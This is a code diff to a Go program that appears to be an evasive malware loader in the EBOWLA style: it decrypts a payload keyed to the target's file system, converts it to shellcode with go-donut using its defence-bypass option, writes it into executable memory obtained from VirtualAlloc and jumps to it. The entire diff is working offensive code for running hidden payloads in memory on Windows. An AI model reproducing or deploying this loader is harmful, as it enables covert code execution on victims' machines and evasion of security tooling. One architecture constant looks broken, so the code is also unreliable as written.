@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/sha512"
@@ -11,6 +12,10 @@ import (
 	"path/filepath"
 	"runtime"
 	"sync"
+	"syscall"
+	"unsafe"
+
+	"github.com/Binject/go-donut/donut"
 )
 
 var (
@@ -20,8 +25,6 @@ var (
 )
 
 func main() {
-	//loader, err := universal.NewLoader()
-	//checkFatalErr("failed to instantiate loader", err)
 	if len(seedPath) < 1 {
 		seedPath = os.Getenv("SystemDrive") + string(os.PathSeparator)
 	}
@@ -67,9 +70,28 @@ func main() {
 				if len(decryptedPayload) < 1 {
 					continue
 				}
-				//loader.LoadLibrary("loaded by EBOWLA2", &decryptedPayload)
-				println(string(decryptedPayload))
-				os.Exit(0) // replace with return to keep process open
+				shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(decryptedPayload), &donut.DonutConfig{
+					Arch:     donut.X84,
+					Type:     donut.DONUT_MODULE_EXE,
+					InstType: donut.DONUT_INSTANCE_PIC,
+					Entropy:  donut.DONUT_ENTROPY_DEFAULT,
+					Compress: 1,
+					Format:   1,
+					Bypass:   3,
+				})
+				if err != nil {
+					continue
+				}
+				loadAddr, _, err := syscall.NewLazyDLL("Kernel32.dll").NewProc("VirtualAlloc").Call(
+					0, uintptr(len(shellcode.Bytes())), 0x1000|0x2000 /* MEM_COMMIT | MEM_RESERVE */, 0x40, /*PAGE_EXECUTE_READWRITE */
+				)
+				if err != nil && err.Error() != "The operation completed successfully." {
+					continue
+				}
+				for index, shellcodeByte := range shellcode.Bytes() {
+					*(*byte)(unsafe.Pointer(loadAddr + uintptr(index))) = shellcodeByte
+				}
+				syscall.Syscall(loadAddr, 0, 0, 0, 0)
 			}
 		}()
 	}
